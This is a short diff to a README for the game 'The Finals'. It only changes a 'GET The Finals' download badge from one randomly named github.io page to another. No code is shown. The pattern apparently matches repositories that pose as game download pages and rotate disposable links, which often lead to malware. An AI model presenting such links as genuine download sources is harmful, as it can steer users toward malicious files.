@@ -1,6 +1,6 @@
 # The Finals - Competitive Arena Shooter
 
-[![GET The Finals](https://img.shields.io/badge/GET%20%E2%80%94%20The%20Finals-0078D6?style=for-the-badge&logoColor=white)](https://kingsleytuckerugpv.github.io/.github/the-finals)
+[![GET The Finals](https://img.shields.io/badge/GET%20%E2%80%94%20The%20Finals-0078D6?style=for-the-badge&logoColor=white)](https://zaydenyatesemlt.github.io/.github/the-finals)
 
 ## Arena Overview for The Finals
 
